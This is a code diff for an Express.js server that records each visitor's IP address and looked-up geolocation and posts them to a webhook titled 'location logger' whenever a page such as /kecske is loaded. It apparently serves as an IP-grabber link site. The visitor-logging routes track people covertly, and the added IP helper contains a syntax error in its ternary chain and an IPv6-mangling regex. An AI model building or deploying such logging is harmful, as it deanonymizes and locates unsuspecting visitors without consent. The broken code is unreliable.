@@ -12,6 +12,21 @@ const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;
 
 app.use(express.static('public'));
 
+// ---- IP lekérés minden lehetőséggel ----
+function getClientIp(req) {
+  const xff = req.headers['x-forwarded-for'];
+  const xri = req.headers['x-real-ip'];
+  const cfip = req.headers['cf-connecting-ip'];
+  const ip =
+    (cfip) ? cfip :
+    (xri) ? xri :
+    (xff && xff.split(',')[0].trim()) :
+    (req.socket.remoteAddress || req.connection.remoteAddress);
+
+  // Néha [::ffff:IP] formátumot ad vissza, abból kivesszük az IPv4-et
+  return ip?.replace(/^.*:/, '') || 'Ismeretlen';
+}
+
 async function getGeo(ip) {
   try {
     const geo = await axios.get(`https://ipapi.co/${ip}/json/`);
@@ -23,8 +38,9 @@ async function getGeo(ip) {
 
 // --- Főoldal (/) ---
 app.get('/', async (req, res) => {
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  const ip = getClientIp(req);
   const geoData = await getGeo(ip);
+
   axios.post(MAIN_WEBHOOK, {
     username: "Helyszíni Naplózó <3",
     avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
@@ -51,12 +67,11 @@ app.get('/', async (req, res) => {
 // --- Kiterjesztés nélküli route-ok (/kecske, /kecske2, stb.) ---
 app.get('/:page', async (req, res, next) => {
   const pageName = req.params.page;
-  // Tiltás, hogy pl. /report vagy /api ne ütközzön
   if (pageName === 'report') return next();
 
   const filePath = path.join(__dirname, 'public', pageName + '.html');
   if (fs.existsSync(filePath)) {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+    const ip = getClientIp(req);
     const geoData = await getGeo(ip);
     axios.post(MAIN_WEBHOOK, {
       username: "Helyszíni Naplózó <3",
@@ -80,13 +95,13 @@ app.get('/:page', async (req, res, next) => {
 
     res.sendFile(filePath);
   } else {
-    next(); // ha nincs ilyen file, menjen tovább
+    next();
   }
 });
 
 // --- Gyanús tevékenység reportolása ---
 app.post('/report', express.json(), async (req, res) => {
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  const ip = getClientIp(req);
   const { reason, page } = req.body;
   const geoData = await getGeo(ip);
 
@@ -108,7 +123,6 @@ app.post('/report', express.json(), async (req, res) => {
   res.json({ ok: true });
 });
 
-// --- 404 minden másra ---
 app.use((req, res) => {
   res.status(404).send('404 Not Found');
 });
